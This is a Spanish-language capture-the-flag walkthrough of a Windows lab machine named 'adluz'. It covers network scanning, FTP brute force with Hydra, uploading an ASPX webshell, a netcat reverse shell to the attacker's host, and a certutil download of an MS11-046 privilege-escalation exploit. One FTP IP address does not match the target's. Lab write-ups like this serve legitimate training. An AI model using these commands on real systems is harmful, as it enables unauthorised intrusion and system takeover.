
# **📌  Reconocimiento y Enumeración - Máquina adluz**

---



## **🔍 Fase 1: Reconocimiento y Escaneo de Red**

### **1.1. Descubrimiento de Hosts Activos (`netdiscover`)**
```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```
- **Objetivo**: Identificar hosts activos en la red `192.168.1.0/24`.
- **Resultado**: Se detectó la máquina `192.168.1.95` (Windows NT).

---

### **1.2. Escaneo de Puertos (`nmap`)**
#### **Escaneo Rápido de Todos los Puertos**
```bash
sudo nmap -sS -n -Pn -vvv --open --min-rate 5000 -p- 192.168.1.95 -oG allPorts
```
- **Parámetros**:
  - `-sS`: Escaneo TCP SYN (stealth).
  - `-n`: Evita resolución DNS.
  - `-Pn`: Omite detección de hosts.
  - `--open`: Muestra solo puertos abiertos.
  - `--min-rate 5000`: Acelera el escaneo.
  - `-p-`: Escanea todos los puertos (1-65535).
- **Resultado**: Se guardó en `allPorts`.

#### **Extracción de Puertos Abiertos**
```bash
extractPorts allPorts
```
- **Salida**:
  ```plaintext
  21, 80, 135, 139, 445, 49152, 49153, 49154, 49155, 49156, 49157, 49158
  ```

#### **Escaneo Profundo con Servicios y Versiones**
```bash
sudo nmap -sS -n -Pn -vvv -sCV -p21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 --min-rate 5000 192.168.1.95 -oN target
```
- **Parámetros**:
  - `-sCV`: Detecta servicios y versiones (`-sV` + `-sC`).
- **Resultados clave**:
  | **Puerto** | **Servicio**       | **Versión**               | **Estado** |
  |------------|--------------------|---------------------------|------------|
  | 21         | FTP                | Microsoft FTP Service     | Abierto    |
  | 80         | HTTP               | Microsoft IIS 7.5         | Abierto    |
  | 135, 139, 445 | SMB/RPC           | Windows NT                | Abierto    |
  | 49152-49158 | Puertos dinámicos (WinRM?) | - | Abiertos |

---

## **🔓 Fase 2: Intrusión y Acceso Inicial**

### **2.1. Fuerza Bruta en FTP (`hydra`)**
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ftp://192.168.1.95
```
- **Resultado**:
  ```plaintext
  [21][ftp] host: 192.168.1.95   login: info   password: PolniyPizdec0211
  ```
- **Credenciales obtenidas**:
  - **Usuario**: `info`
  - **Contraseña**: `PolniyPizdec0211`

---

### **2.2. Subida de WebShell (`cmdasp.aspx`)**
1. **Preparación**:
   ```bash
   cp /usr/share/webshells/aspx/cmdasp.aspx .
   ```
2. **Conexión FTP**:
   ```bash
   ftp info@192.168.80.95
   ```
   - **Credenciales**: `info:PolniyPizdec0211`
   - **Comandos FTP**:
     ```ftp
     put cmdasp.aspx
     ls
     ```
   - **Resultado**:
     ```plaintext
     -rw-rw-rw-   1 owner    group            1442 Jun 20 15:54 cmdasp.aspx
     ```

3. **Acceso vía Web**:
   - **URL**: `http://192.168.1.95/cmdasp.aspx`
   - **Comando ejecutado**:
     ```cmd
     \\192.168.1.22\webshell\nc.exe -e cmd.exe 192.168.1.22 443
     ```

<img width="519" height="181" alt="image" src="https://github.com/user-attachments/assets/faf0e0f6-12eb-4103-919f-448bc60fa091" />

     
<img width="614" height="123" alt="image" src="https://github.com/user-attachments/assets/0c50d4b8-9f9c-4720-b25f-ecaaf95e4637" />

---

## **🚀 Fase 3: Post-Explotación y Escalada de Privilegios**

### **3.1. Configuración de Servidores**
1. **Servidor SMB (`impacket-smbserver`)**:
   ```bash
   impacket-smbserver webshell /ruta/a/webshell
   ```
2. **Servidor HTTP (`python3`)**:
   ```bash
   python3 -m http.server 80
   ```
<img width="1315" height="601" alt="image" src="https://github.com/user-attachments/assets/f85a6d4a-446b-492d-9b62-0431327d7051" />

---

### **3.2. Descarga y Ejecución de Exploit (`certutil`)**
1. **Descarga del exploit**:
   ```cmd
   certutil.exe -f -urlcache -split http://192.168.1.22/ms11-046.exe
   ```
2. **Ejecución**:
   ```cmd
   ms11-046.exe
   ```
   <img width="443" height="373" alt="image" src="https://github.com/user-attachments/assets/b935bc5b-6a1d-4f97-8535-c5e6cc87e254" />

3. **Verificación de privilegios**:
   ```cmd
   whoami
   ```
   - **Resultado**: `nt authority\servicio de red` → **Administrador** (tras exploit).

---

### **3.3. Obtención de Flag (`root.txt`)**
```cmd
c:\Users\Administrador\Desktop>type root.txt
xxxxxxxxxxxxxx
```

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/5017e487-4213-4fc2-ac5f-2a557cb8008b" />


